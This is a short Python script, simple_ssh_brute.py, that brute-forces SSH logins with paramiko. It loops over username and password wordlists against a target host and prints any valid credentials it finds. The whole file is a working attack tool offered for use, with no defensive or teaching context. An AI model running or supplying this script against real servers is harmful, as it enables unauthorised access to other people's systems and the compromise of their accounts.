# simple_ssh_brute.py
import paramiko
import sys

def ssh_connect(host, username, password, port=22):
    """Attempts an SSH connection with provided credentials."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password, timeout=3)
        print(f"[+] Found Valid Credentials: {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Invalid Credentials: {username}:{password}")
        return False
    except paramiko.SSHException as e:
        print(f"[-] SSH Error: {e}")
        return False
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python simple_ssh_brute.py <host> <username_file> <password_file>")
        sys.exit(1)

    host = sys.argv[1]
    user_file = sys.argv[2]
    pass_file = sys.argv[3]

    print(f"[*] Starting SSH brute-force against {host}...")

    # Load usernames and passwords
    with open(user_file, 'r') as f:
        usernames = [line.strip() for line in f]
    
    with open(pass_file, 'r') as f:
        passwords = [line.strip() for line in f]

    found = False
    for user in usernames:
        for password in passwords:
            if ssh_connect(host, user, password):
                found = True
                break
        if found:
            break
    
    if not found:
        print("\n[-] Brute-force finished. No valid credentials found.")
